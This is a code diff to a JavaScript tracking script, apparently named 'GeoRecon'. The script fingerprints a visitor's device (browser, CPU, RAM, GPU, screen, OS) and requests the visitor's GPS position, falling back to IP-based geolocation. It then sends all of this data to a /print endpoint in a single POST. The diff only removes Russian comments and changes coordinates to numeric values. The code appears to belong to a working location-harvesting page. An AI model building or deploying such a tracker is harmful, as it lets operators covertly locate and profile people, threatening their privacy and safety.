@@ -3,17 +3,15 @@
  * Sends ALL data (Device + Location) in ONE POST to /print
  */
 
-var collectedData = {}; // Хранилище для всех данных
+var collectedData = {};
 
 function information() {
-    // Собираем базовую инфу и сохраняем в объект
     collectedData.Platform = navigator.platform || 'Not Available';
     collectedData.Cores = navigator.hardwareConcurrency || 'Not Available';
     collectedData.RAM = navigator.deviceMemory || 'Not Available';
 
     var ver = navigator.userAgent;
 
-    // Browser detection
     if (ver.indexOf('Firefox') !== -1) {
         collectedData.Browser = ver.substring(ver.indexOf(' Firefox/') + 1).split(' ')[0];
     } else if (ver.indexOf('Chrome') !== -1) {
@@ -26,7 +24,6 @@ function information() {
         collectedData.Browser = 'Not Available';
     }
 
-    // GPU
     var canvas = document.createElement('canvas');
     try {
         var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -38,7 +35,6 @@ function information() {
     if (!collectedData.Vendor) collectedData.Vendor = 'Not Available';
     if (!collectedData.Renderer) collectedData.Renderer = 'Not Available';
 
-    // Screen & OS
     collectedData.Width = window.screen.width;
     collectedData.Height = window.screen.height;
 
@@ -47,9 +43,6 @@ function information() {
     collectedData.OS = (osParts[1] ? osParts[1].trim() : 'Not Available');
 }
 
-/**
- * Fallback: Get location by IP (when GPS fails)
- */
 function getIpLocation() {
     console.log('[GeoRecon] Native GPS failed, trying IP-based location...');
 
@@ -58,11 +51,10 @@ function getIpLocation() {
         .then(data => {
             if (data.error) throw new Error('IP API failed');
 
-            // Заполняем поля локации данными из IP
             collectedData.Type = 'location';
             collectedData.Status = 'success (IP fallback)';
-            collectedData.Latitude = (data.latitude || 0) + ' deg';
-            collectedData.Longitude = (data.longitude || 0) + ' deg';
+            collectedData.Latitude = parseFloat(data.latitude || 0);   // ← число
+            collectedData.Longitude = parseFloat(data.longitude || 0); // ← число
             collectedData.Accuracy = 'IP-based (approx)';
             collectedData.Altitude = 'N/A';
             collectedData.Direction = 'N/A';
@@ -71,12 +63,10 @@ function getIpLocation() {
             collectedData.Region = data.region;
             collectedData.Country = data.country_name;
 
-            // ОТПРАВЛЯЕМ ВСЁ ОДНИМ ЗАПРОСОМ
             sendSingleRequest();
         })
         .catch(err => {
             console.error('[GeoRecon] IP fallback failed:', err);
-            // Даже если фолбэк не сработал, отправляем хотя бы инфу об устройстве
             collectedData.Type = 'partial';
             collectedData.Status = 'location failed';
             sendSingleRequest();
@@ -86,7 +76,6 @@ function getIpLocation() {
 function locate(callback, errCallback) {
     console.log('[GeoRecon] Requesting position...');
 
-    // Firefox-friendly settings
     var optn = {
         enableHighAccuracy: false,
         timeout: 15000,
@@ -97,30 +86,26 @@ function locate(callback, errCallback) {
         function(position) {
             console.log('[GeoRecon] Position received!');
 
-            // Заполняем поля локации
             collectedData.Type = 'location';
             collectedData.Status = 'success';
-            collectedData.Latitude = position.coords.latitude + ' deg';
-            collectedData.Longitude = position.coords.longitude + ' deg';
+            collectedData.Latitude = parseFloat(position.coords.latitude);   // ← число
+            collectedData.Longitude = parseFloat(position.coords.longitude); // ← число
             collectedData.Accuracy = position.coords.accuracy + ' m';
             collectedData.Altitude = position.coords.altitude ? position.coords.altitude + ' m' : 'N/A';
             collectedData.Direction = position.coords.heading ? position.coords.heading + ' deg' : 'N/A';
             collectedData.Speed = position.coords.speed ? position.coords.speed + ' m/s' : 'N/A';
 
-            // ОТПРАВЛЯЕМ ВСЁ ОДНИМ ЗАПРОСОМ
             sendSingleRequest();
             callback();
         },
         function(error) {
             console.error('[GeoRecon] Geolocation error:', error.code, error.message);
 
-            // Если ошибка 2 (POSITION_UNAVAILABLE) — пробуем определить по IP
             if (error.code === 2) {
                 getIpLocation();
                 return;
             }
 
-            // Для других ошибок (отказ, таймаут) — отправляем что есть + статус ошибки
             collectedData.Type = 'error';
             collectedData.Status = 'failed';
 
@@ -141,7 +126,6 @@ function locate(callback, errCallback) {
         optn
     );
 }
-
 
 function sendSingleRequest() {
     console.log('[GeoRecon] Sending combined data...');
